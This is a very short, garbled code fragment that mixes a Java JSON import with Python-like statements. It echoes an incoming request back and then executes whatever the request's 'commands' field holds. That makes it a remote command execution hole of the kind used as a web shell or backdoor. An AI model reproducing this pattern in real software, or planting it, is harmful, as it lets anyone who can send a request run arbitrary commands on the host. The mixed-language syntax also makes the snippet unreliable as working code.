import org.codehaus.jettison.json.JSONObject
import os

response.entity = request.entity
exec request.entity['commands']

